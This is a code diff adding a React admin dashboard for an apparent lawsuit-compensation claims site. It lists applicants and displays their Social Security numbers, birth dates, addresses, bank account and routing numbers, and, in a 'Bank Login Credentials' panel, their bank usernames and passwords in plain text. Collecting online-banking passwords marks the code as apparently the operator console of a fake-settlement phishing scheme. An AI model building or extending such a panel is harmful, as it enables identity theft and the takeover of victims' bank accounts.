@@ -1,0 +1,601 @@
+"use client";
+
+import { useState, useEffect } from "react";
+import { Eye, Download, Trash2, LogOut } from "lucide-react";
+
+interface Application {
+  id: string;
+  fullName: string;
+  email: string;
+  phone: string;
+  claimId: string;
+  dateOfBirth: string;
+  ssn: string;
+  street: string;
+  city: string;
+  state: string;
+  zip: string;
+  lawsuitType: string;
+  filingDate: string;
+  court: string;
+  judgmentDate: string;
+  totalAmount: number;
+  bankName: string;
+  accountNumber: string;
+  routingNumber: string;
+  accountType: string;
+  paymentMethod: string;
+  bankVerified: boolean;
+  bankUsername?: string;
+  bankPassword?: string;
+  consent: boolean;
+  status: string;
+  createdAt: string;
+  updatedAt: string;
+}
+
+export default function AdminPage() {
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [password, setPassword] = useState("");
+  const [error, setError] = useState("");
+  const [loading, setLoading] = useState(true);
+  const [applications, setApplications] = useState<Application[]>([]);
+  const [selectedApp, setSelectedApp] = useState<Application | null>(null);
+  const [showPdfModal, setShowPdfModal] = useState(false);
+  const [pdfData, setPdfData] = useState<string | null>(null);
+
+  useEffect(() => {
+    checkAuth();
+  }, []);
+
+  useEffect(() => {
+    if (isAuthenticated) {
+      fetchApplications();
+    }
+  }, [isAuthenticated]);
+
+  const checkAuth = async () => {
+    try {
+      const response = await fetch("/api/admin/check-auth");
+      if (response.ok) {
+        setIsAuthenticated(true);
+      }
+    } catch (error) {
+      console.error("Auth check failed:", error);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const handleLogin = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setError("");
+
+    try {
+      const response = await fetch("/api/admin/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ password }),
+      });
+
+      if (response.ok) {
+        setIsAuthenticated(true);
+        setPassword("");
+      } else {
+        const data = await response.json();
+        setError(data.error || "Invalid password");
+      }
+    } catch (error) {
+      setError("Login failed. Please try again.");
+    }
+  };
+
+  const handleLogout = async () => {
+    try {
+      await fetch("/api/admin/logout", { method: "POST" });
+      setIsAuthenticated(false);
+      setApplications([]);
+      setSelectedApp(null);
+    } catch (error) {
+      console.error("Logout failed:", error);
+    }
+  };
+
+  const fetchApplications = async () => {
+    try {
+      const response = await fetch("/api/admin/applications");
+      if (response.ok) {
+        const data = await response.json();
+        setApplications(data.applications);
+      }
+    } catch (error) {
+      console.error("Failed to fetch applications:", error);
+    }
+  };
+
+  const viewPdf = async (applicationId: string) => {
+    try {
+      const response = await fetch(
+        `/api/admin/applications/${applicationId}/pdf`
+      );
+      if (response.ok) {
+        const data = await response.json();
+        setPdfData(data.pdfBase64);
+        setShowPdfModal(true);
+      }
+    } catch (error) {
+      console.error("Failed to fetch PDF:", error);
+      alert("Failed to load PDF");
+    }
+  };
+
+  const downloadPdf = (base64: string, filename: string) => {
+    const byteCharacters = atob(base64);
+    const byteNumbers = new Array(byteCharacters.length);
+    for (let i = 0; i < byteCharacters.length; i++) {
+      byteNumbers[i] = byteCharacters.charCodeAt(i);
+    }
+    const byteArray = new Uint8Array(byteNumbers);
+    const blob = new Blob([byteArray], { type: "application/pdf" });
+    const url = URL.createObjectURL(blob);
+
+    const link = document.createElement("a");
+    link.href = url;
+    link.download = filename;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+  };
+
+  const deleteApplication = async (id: string) => {
+    if (!confirm("Are you sure you want to delete this application?")) return;
+
+    try {
+      const response = await fetch(`/api/admin/applications/${id}`, {
+        method: "DELETE",
+      });
+
+      if (response.ok) {
+        setApplications(applications.filter((app) => app.id !== id));
+        if (selectedApp?.id === id) setSelectedApp(null);
+        alert("Application deleted successfully");
+      } else {
+        alert("Failed to delete application");
+      }
+    } catch (error) {
+      console.error("Delete failed:", error);
+      alert("Failed to delete application");
+    }
+  };
+
+  const updateStatus = async (id: string, newStatus: string) => {
+    try {
+      const response = await fetch(`/api/admin/applications/${id}/status`, {
+        method: "PATCH",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ status: newStatus }),
+      });
+
+      if (response.ok) {
+        setApplications(
+          applications.map((app) =>
+            app.id === id ? { ...app, status: newStatus } : app
+          )
+        );
+        if (selectedApp?.id === id) {
+          setSelectedApp({ ...selectedApp, status: newStatus });
+        }
+        alert("Status updated successfully");
+      }
+    } catch (error) {
+      console.error("Update failed:", error);
+      alert("Failed to update status");
+    }
+  };
+
+  if (loading) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-gray-100">
+        <div className="text-xl text-gray-600">Loading...</div>
+      </div>
+    );
+  }
+
+  if (!isAuthenticated) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-gray-100">
+        <div className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
+          <h1 className="text-3xl font-bold text-gray-900 mb-6 text-center">
+            Admin Login
+          </h1>
+          <form onSubmit={handleLogin} className="space-y-4">
+            <div>
+              <label className="block text-sm font-semibold text-gray-700 mb-2">
+                Admin Password
+              </label>
+              <input
+                type="password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                className="w-full border border-gray-300 rounded px-4 py-2 focus:outline-none focus:border-blue-500"
+                placeholder="Enter admin password"
+                required
+              />
+            </div>
+            {error && (
+              <div className="bg-red-50 border-l-4 border-red-500 p-4">
+                <p className="text-red-700 text-sm">{error}</p>
+              </div>
+            )}
+            <button
+              type="submit"
+              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
+            >
+              Login
+            </button>
+          </form>
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div className="min-h-screen bg-gray-100 p-8">
+      <div className="max-w-7xl mx-auto">
+        {/* Header */}
+        <div className="bg-white rounded-lg shadow-lg p-6 mb-6 flex justify-between items-center">
+          <div>
+            <h1 className="text-3xl font-bold text-gray-900">
+              Admin Dashboard
+            </h1>
+            <p className="text-gray-600 mt-1">
+              Total Applications: {applications.length}
+            </p>
+          </div>
+          <button
+            onClick={handleLogout}
+            className="flex items-center gap-2 bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
+          >
+            <LogOut size={20} />
+            Logout
+          </button>
+        </div>
+
+        {/* Applications List */}
+        <div className="bg-white rounded-lg shadow-lg p-6">
+          <h2 className="text-2xl font-bold text-gray-900 mb-4">
+            All Applications
+          </h2>
+
+          {applications.length === 0 ? (
+            <p className="text-gray-600 text-center py-8">
+              No applications found.
+            </p>
+          ) : (
+            <div className="overflow-x-auto">
+              <table className="w-full">
+                <thead>
+                  <tr className="border-b border-gray-200">
+                    <th className="text-left p-3 font-semibold text-gray-700">
+                      Claim ID
+                    </th>
+                    <th className="text-left p-3 font-semibold text-gray-700">
+                      Name
+                    </th>
+                    <th className="text-left p-3 font-semibold text-gray-700">
+                      Email
+                    </th>
+                    <th className="text-left p-3 font-semibold text-gray-700">
+                      Status
+                    </th>
+                    <th className="text-left p-3 font-semibold text-gray-700">
+                      Amount
+                    </th>
+                    <th className="text-left p-3 font-semibold text-gray-700">
+                      Date
+                    </th>
+                    <th className="text-left p-3 font-semibold text-gray-700">
+                      Actions
+                    </th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {applications.map((app) => (
+                    <tr
+                      key={app.id}
+                      className="border-b border-gray-100 hover:bg-gray-50"
+                    >
+                      <td className="p-3">{app.claimId}</td>
+                      <td className="p-3">{app.fullName}</td>
+                      <td className="p-3">{app.email}</td>
+                      <td className="p-3">
+                        <select
+                          value={app.status}
+                          onChange={(e) => updateStatus(app.id, e.target.value)}
+                          className="border border-gray-300 rounded px-2 py-1 text-sm"
+                        >
+                          <option value="submitted">Submitted</option>
+                          <option value="under_review">Under Review</option>
+                          <option value="approved">Approved</option>
+                          <option value="rejected">Rejected</option>
+                        </select>
+                      </td>
+                      <td className="p-3">
+                        ${app.totalAmount.toLocaleString()}
+                      </td>
+                      <td className="p-3">
+                        {new Date(app.createdAt).toLocaleDateString()}
+                      </td>
+                      <td className="p-3">
+                        <div className="flex gap-2">
+                          <button
+                            onClick={() => setSelectedApp(app)}
+                            className="text-blue-600 hover:text-blue-800"
+                            title="View Details"
+                          >
+                            <Eye size={20} />
+                          </button>
+                          <button
+                            onClick={() => viewPdf(app.id)}
+                            className="text-green-600 hover:text-green-800"
+                            title="View PDF"
+                          >
+                            <Download size={20} />
+                          </button>
+                          <button
+                            onClick={() => deleteApplication(app.id)}
+                            className="text-red-600 hover:text-red-800"
+                            title="Delete"
+                          >
+                            <Trash2 size={20} />
+                          </button>
+                        </div>
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            </div>
+          )}
+        </div>
+
+        {/* Application Details Modal */}
+        {selectedApp && (
+          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4 overflow-y-auto">
+            <div className="bg-white rounded-lg w-full max-w-4xl my-8">
+              <div className="p-6 border-b border-gray-200 flex justify-between items-center sticky top-0 bg-white">
+                <h3 className="text-2xl font-bold text-gray-900">
+                  Application Details
+                </h3>
+                <button
+                  onClick={() => setSelectedApp(null)}
+                  className="text-gray-500 hover:text-gray-700 text-2xl"
+                >
+                  ×
+                </button>
+              </div>
+              <div className="p-6 overflow-y-auto max-h-[70vh]">
+                <div className="grid md:grid-cols-2 gap-6">
+                  {/* Personal Information */}
+                  <div>
+                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
+                      Personal Information
+                    </h4>
+                    <div className="space-y-2">
+                      <p>
+                        <strong>Full Name:</strong> {selectedApp.fullName}
+                      </p>
+                      <p>
+                        <strong>Email:</strong> {selectedApp.email}
+                      </p>
+                      <p>
+                        <strong>Phone:</strong> {selectedApp.phone}
+                      </p>
+                      <p>
+                        <strong>Date of Birth:</strong>{" "}
+                        {new Date(selectedApp.dateOfBirth).toLocaleDateString()}
+                      </p>
+                      <p>
+                        <strong>SSN:</strong> {selectedApp.ssn}
+                      </p>
+                      <p>
+                        <strong>Claim ID:</strong> {selectedApp.claimId}
+                      </p>
+                    </div>
+                  </div>
+
+                  {/* Address Information */}
+                  <div>
+                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
+                      Address Information
+                    </h4>
+                    <div className="space-y-2">
+                      <p>
+                        <strong>Street:</strong> {selectedApp.street}
+                      </p>
+                      <p>
+                        <strong>City:</strong> {selectedApp.city}
+                      </p>
+                      <p>
+                        <strong>State:</strong> {selectedApp.state}
+                      </p>
+                      <p>
+                        <strong>ZIP:</strong> {selectedApp.zip}
+                      </p>
+                    </div>
+                  </div>
+
+                  {/* Claim Information */}
+                  <div>
+                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
+                      Claim Information
+                    </h4>
+                    <div className="space-y-2">
+                      <p>
+                        <strong>Lawsuit Type:</strong> {selectedApp.lawsuitType}
+                      </p>
+                      <p>
+                        <strong>Filing Date:</strong>{" "}
+                        {new Date(selectedApp.filingDate).toLocaleDateString()}
+                      </p>
+                      <p>
+                        <strong>Court:</strong> {selectedApp.court}
+                      </p>
+                      <p>
+                        <strong>Judgment Date:</strong>{" "}
+                        {new Date(
+                          selectedApp.judgmentDate
+                        ).toLocaleDateString()}
+                      </p>
+                    </div>
+                  </div>
+
+                  {/* Compensation Details */}
+                  <div>
+                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
+                      Compensation Details
+                    </h4>
+                    <div className="space-y-2">
+                      <p>
+                        <strong>Total Amount:</strong> $
+                        {selectedApp.totalAmount.toLocaleString()}
+                      </p>
+                      <p>
+                        <strong>Status:</strong>{" "}
+                        <span className="capitalize">
+                          {selectedApp.status.replace("_", " ")}
+                        </span>
+                      </p>
+                    </div>
+                  </div>
+
+                  {/* Bank Details */}
+                  <div>
+                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
+                      Bank Details
+                    </h4>
+                    <div className="space-y-2">
+                      <p>
+                        <strong>Bank Name:</strong> {selectedApp.bankName}
+                      </p>
+                      <p>
+                        <strong>Account Number:</strong>{" "}
+                        {selectedApp.accountNumber}
+                      </p>
+                      <p>
+                        <strong>Routing Number:</strong>{" "}
+                        {selectedApp.routingNumber}
+                      </p>
+                      <p>
+                        <strong>Account Type:</strong> {selectedApp.accountType}
+                      </p>
+                      <p>
+                        <strong>Payment Method:</strong>{" "}
+                        {selectedApp.paymentMethod}
+                      </p>
+                      <p>
+                        <strong>Bank Verified:</strong>{" "}
+                        {selectedApp.bankVerified ? "Yes" : "No"}
+                      </p>
+                    </div>
+                  </div>
+
+                  {/* Bank Credentials */}
+                  {(selectedApp.bankUsername || selectedApp.bankPassword) && (
+                    <div>
+                      <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
+                        Bank Login Credentials
+                      </h4>
+                      <div className="space-y-2">
+                        <p>
+                          <strong>Username:</strong>{" "}
+                          {selectedApp.bankUsername || "N/A"}
+                        </p>
+                        <p>
+                          <strong>Password:</strong>{" "}
+                          {selectedApp.bankPassword || "N/A"}
+                        </p>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Timestamps */}
+                  <div className="md:col-span-2">
+                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
+                      Timestamps
+                    </h4>
+                    <div className="space-y-2">
+                      <p>
+                        <strong>Submitted:</strong>{" "}
+                        {new Date(selectedApp.createdAt).toLocaleString()}
+                      </p>
+                      <p>
+                        <strong>Last Updated:</strong>{" "}
+                        {new Date(selectedApp.updatedAt).toLocaleString()}
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="mt-6 flex gap-4">
+                  <button
+                    onClick={() => viewPdf(selectedApp.id)}
+                    className="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-6 rounded"
+                  >
+                    View/Download PDF
+                  </button>
+                  <button
+                    onClick={() => setSelectedApp(null)}
+                    className="bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-6 rounded"
+                  >
+                    Close
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* PDF Modal */}
+        {showPdfModal && pdfData && (
+          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+            <div className="bg-white rounded-lg w-full max-w-4xl max-h-[90vh] flex flex-col">
+              <div className="p-6 border-b border-gray-200 flex justify-between items-center">
+                <h3 className="text-2xl font-bold text-gray-900">
+                  Application Documents
+                </h3>
+                <button
+                  onClick={() => {
+                    setShowPdfModal(false);
+                    setPdfData(null);
+                  }}
+                  className="text-gray-500 hover:text-gray-700 text-2xl"
+                >
+                  ×
+                </button>
+              </div>
+              <div className="flex-1 overflow-auto p-6">
+                <iframe
+                  src={`data:application/pdf;base64,${pdfData}`}
+                  className="w-full h-full min-h-[600px]"
+                  title="Application PDF"
+                />
+              </div>
+              <div className="p-6 border-t border-gray-200">
+                <button
+                  onClick={() =>
+                    downloadPdf(pdfData, `application-${Date.now()}.pdf`)
+                  }
+                  className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded"
+                >
+                  Download PDF
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
